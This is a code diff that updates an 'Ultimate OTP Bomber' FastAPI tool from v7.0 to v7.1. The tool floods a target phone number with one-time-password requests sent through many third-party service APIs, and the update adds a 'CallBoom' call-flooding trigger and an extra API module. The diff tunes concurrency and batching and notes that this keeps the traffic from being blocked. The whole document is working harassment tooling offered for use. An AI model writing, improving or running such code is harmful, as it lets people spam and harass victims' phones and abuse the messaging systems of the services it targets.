@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-🔥 ULTIMATE OTP BOMBER - FIXED v7.0 🔥
+🔥 ULTIMATE OTP BOMBER - FIXED v7.1 🔥
 ✅ SSL FIXED
 ✅ BATCH FIXED  
 ✅ VALIDATION FIXED
 ✅ REALISTIC IP
+✅ CALLBOOM AUTO-TRIGGER
 """
 
 import asyncio
@@ -24,7 +25,7 @@ import uvicorn
 # ==============================================================================
 
 ALL_API_FILES = []
-for i, module_name in enumerate(["apis", "apis1", "apis2", "apis3", "apis4"]):
+for i, module_name in enumerate(["apis", "apis1", "apis2", "apis3", "apis4", "apis6"]):
     try:
         mod = __import__(module_name)
         for attr in ["ULTIMATE_APIS", "ULTIMATE_APIS_2", "ULTIMATE_APIS_3", "ULTIMATE_APIS_4", "ULTIMATE_APIS_5"]:
@@ -58,14 +59,14 @@ except ImportError:
 # ==============================================================================
 # 🚀 FASTAPI
 # ==============================================================================
-app = FastAPI(title="Ultimate OTP Bomber", version="7.0")
+app = FastAPI(title="Ultimate OTP Bomber", version="7.1")
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
 # ==============================================================================
-# ⚙️ CONFIG — FIXED
+# ⚙️ CONFIG
 # ==============================================================================
-MAX_CONCURRENT  = 500           # ⬇️ 10000 se 500 (block nahi hoga)
-BATCH_CHUNK     = 30            # ⬇️ 1000 se 30 (server pe load kam)
+MAX_CONCURRENT  = 500
+BATCH_CHUNK     = 30
 REQUEST_TIMEOUT = 8
 CONNECT_TIMEOUT = 4
 
@@ -82,26 +83,22 @@ _stop_flags = set()
 _stats = defaultdict(lambda: {"total": 0, "ok": 0, "otp": 0, "fail": 0, "start": 0})
 
 # ==============================================================================
-# 🔥 CORE FIRE (FIXED)
+# 🔥 CORE FIRE
 # ==============================================================================
 async def fire_one(session, api, phone, stats):
     try:
-        # URL
         url = api["url"](phone) if callable(api.get("url")) else api["url"]
 
-        # Headers
         headers = dict(api.get("headers", {}))
         if not any(k.lower() == "user-agent" for k in headers.keys()):
             headers["User-Agent"] = random.choice(REAL_USER_AGENTS)
 
-        # Payload
         data = None
         if api.get("data"):
             data = api["data"](phone) if callable(api["data"]) else api["data"]
 
         method = api.get("method", "POST").upper()
 
-        # 🔥 FIXED: ssl=False hata diya + proper timeout
         if method == "POST":
             async with session.post(url, headers=headers, data=data) as r:
                 status = r.status
@@ -119,18 +116,16 @@ async def fire_one(session, api, phone, stats):
 
         stats["total"] += 1
 
-        # 🔥 FIXED: Sirf strong error keywords
         body_lower = txt[:800].lower()
         strong_errors = ["unauthorized", "forbidden", "blocked", "captcha required", "invalid captcha"]
         is_error = any(k in body_lower for k in strong_errors)
 
         if status < 400 and not is_error:
             stats["ok"] += 1
-            # 🔥 FIXED: broad success keywords
-            success_keys = ["success", "sent", "otp", "verified", "delivered", "code sent"]
+            success_keys = ["success", "sent", "otp", "verified", "delivered", "code sent", "ok", "started"]
             if any(k in body_lower for k in success_keys):
                 stats["otp"] += 1
-                print(f"  ✅ [{api['name']}] OTP SENT ({status})")
+                print(f"  ✅ [{api['name']}] SENT ({status})")
             else:
                 print(f"  🟡 [{api['name']}] HTTP {status}")
         else:
@@ -145,15 +140,14 @@ async def fire_one(session, api, phone, stats):
         stats["fail"] += 1
 
 # ==============================================================================
-# 🔥 WORKER (FIXED)
+# 🔥 WORKER
 # ==============================================================================
 async def worker(job_id, phone, count):
     _stop_flags.discard(phone)
 
-    # 🔥 FIXED Connector
     connector = aiohttp.TCPConnector(
         limit=MAX_CONCURRENT,
-        limit_per_host=20,           # ⬇️ 100 se 20
+        limit_per_host=20,
         force_close=False,
         enable_cleanup_closed=True,
         ttl_dns_cache=300,
@@ -175,7 +169,6 @@ async def worker(job_id, phone, count):
     print(f"{'='*70}\n")
 
     try:
-        # 🔥 FIXED: header-less session (per-request headers)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             for cycle in range(count):
                 if phone in _stop_flags:
@@ -193,7 +186,7 @@ async def worker(job_id, phone, count):
                     await asyncio.gather(*batch, return_exceptions=True)
                     done = min(i + BATCH_CHUNK, len(tasks))
                     print(f"  📊 {done}/{len(tasks)} ({done*100//len(tasks)}%)")
-                    await asyncio.sleep(0.2)  # ⬅️ FIX: Chhota delay
+                    await asyncio.sleep(0.2)
 
                 elapsed = time.time() - stats["start"]
                 rps = stats["total"] / elapsed if elapsed else 0
@@ -217,7 +210,7 @@ async def worker(job_id, phone, count):
 @app.get("/")
 async def root():
     return {
-        "status": "🔥 OTP BOMBER v7.0 RUNNING",
+        "status": "🔥 OTP BOMBER v7.1 RUNNING",
         "total_apis": TOTAL_APIS,
         "breakdown": {name: len(apis) for name, apis in ALL_API_FILES},
         "config": {"max_concurrent": MAX_CONCURRENT, "batch": BATCH_CHUNK, "timeout": REQUEST_TIMEOUT},
@@ -279,10 +272,11 @@ async def jobs():
 if __name__ == "__main__":
     print(f"""
 ╔══════════════════════════════════════════════════════════╗
-║   🔥  ULTIMATE OTP BOMBER v7.0  🔥                      ║
+║   🔥  ULTIMATE OTP BOMBER v7.1  🔥                      ║
 ║   📊 APIs: {TOTAL_APIS:<44}║
 ║   ⚡ Max: {MAX_CONCURRENT:<45}║
 ║   📦 Batch: {BATCH_CHUNK:<43}║
+║   📞 CallBoom: AUTO-ENABLED                             ║
 ║   🚀 http://0.0.0.0:5000                                ║
 ╚══════════════════════════════════════════════════════════╝
     """)
